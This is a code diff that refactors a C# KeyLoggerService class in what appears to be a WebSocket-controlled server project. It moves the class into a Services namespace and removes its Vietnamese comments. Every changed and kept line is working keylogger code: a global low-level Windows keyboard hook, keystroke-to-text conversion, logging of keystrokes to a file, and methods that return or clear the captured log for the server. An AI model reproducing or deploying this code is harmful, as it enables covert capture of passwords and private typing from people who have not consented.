@@ -6,18 +6,18 @@ using System.IO;
 using System.Text;
 using System.Threading;
 
-namespace WebSocketTest // Đổi namespace cho trùng với project Server
+namespace WebSocketTest.Services
 {
+    // Moved from root: KeyLoggerService implementation
     public static class KeyLoggerService
     {
-        private static string logPath = "fileKeyLog.txt";
+        private static readonly string logPath = "fileKeyLog.txt";
         private static IntPtr _hookID = IntPtr.Zero;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static bool _isRunning = false;
         private static Thread? _hookThread = null;
-        private static object _lockObj = new object(); // Lock để thread-safe
+        private static object _lockObj = new object();
 
-        // Các hàm API của Windows
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
@@ -35,22 +35,18 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
 
-        // --- HÀM ĐIỀU KHIỂN ---
-
         public static void Start()
         {
             lock (_lockObj)
             {
-                if (_isRunning) return; // Đang chạy rồi thì thôi
-
-                // Chạy hook trên một luồng riêng biệt để không làm đơ Server
+                if (_isRunning) return;
                 _hookThread = new Thread(() =>
                 {
                     try
                     {
                         _hookID = SetHook(_proc);
                         _isRunning = true;
-                        Application.Run(); // Vòng lặp giữ hook sống
+                        Application.Run();
                     }
                     catch { }
                     finally { _isRunning = false; }
@@ -70,8 +66,6 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
                     UnhookWindowsHookEx(_hookID);
                     _hookID = IntPtr.Zero;
                     _isRunning = false;
-                    // Thread sẽ tự exit khi không còn events từ keyboard
-                    // Không call Application.Exit() vì nó ảnh hưởng toàn server
                 }
             }
         }
@@ -80,41 +74,25 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
         {
             if (File.Exists(logPath))
             {
-                try 
-                {
-                    // Đọc file log và trả về nội dung
-                    return File.ReadAllText(logPath);
-                }
-                catch { return ""; }
+                try { return File.ReadAllText(logPath); } catch { return ""; }
             }
             return "";
         }
 
         public static void ClearLogs()
         {
-             if (File.Exists(logPath)) File.WriteAllText(logPath, "");
+            if (File.Exists(logPath)) File.WriteAllText(logPath, "");
         }
-
-        // --- HÀM XỬ LÝ (GIỮ NGUYÊN LOGIC CŨ CỦA BẠN) ---
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using Process curProcess = Process.GetCurrentProcess();
             using ProcessModule? curModule = curProcess.MainModule;
-
             string moduleName = curModule?.ModuleName ?? string.Empty;
-
             IntPtr handle = GetModuleHandle(moduleName);
-
-            if (handle == IntPtr.Zero)
-            {
-                // fallback: lấy handle của chính process
-                handle = curProcess.Handle;
-            }
-
+            if (handle == IntPtr.Zero) handle = curProcess.Handle;
             return SetWindowsHookEx(WH_KEYBOARD_LL, proc, handle, 0);
         }
-
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
@@ -124,15 +102,12 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
                 bool shift = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
                 bool caps = Control.IsKeyLocked(Keys.CapsLock);
 
-                // Ghi log thread-safe
                 lock (_lockObj)
                 {
                     try {
                         using (StreamWriter sw = File.AppendText(logPath))
                         {
                             string key = ((Keys)vkCode).ToString();
-
-                            // Xử lý sơ bộ một số phím
                             switch ((Keys)vkCode)
                             {
                                 case Keys.Space: sw.Write(" "); break;
@@ -140,12 +115,7 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
                                 case Keys.Back: sw.Write("[Backspace]"); break;
                                 case Keys.Tab: sw.Write("[Tab]"); break;
                                 default:
-                                    // Logic xử lý chữ hoa/thường
-                                    if (key.Length == 1) // Ký tự A-Z, 0-9
-                                    {
-                                        bool isUpper = shift ^ caps; // XOR
-                                        sw.Write(isUpper ? key.ToUpper() : key.ToLower());
-                                    }
+                                    if (key.Length == 1) { bool isUpper = shift ^ caps; sw.Write(isUpper ? key.ToUpper() : key.ToLower()); }
                                     else
                                     {
                                         switch (key)
@@ -175,16 +145,13 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
                                             case "rShiftKey": sw.Write("[Shift]"); break;
                                             case "LControlKey": sw.Write("[Ctrl]"); break;
                                             case "RControlKey": sw.Write("[Ctrl]"); break;
-                                            default:
-                                                // Ghi tên phím khác dưới dạng [KeyName]
-                                                sw.Write($"[{key}]");
-                                                break;
+                                            default: sw.Write($"[{key}]"); break;
                                         }
                                     }
                                     break;
                             }
                         }
-                    } catch { /* Bỏ qua lỗi ghi file */ }
+                    } catch { }
                 }
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
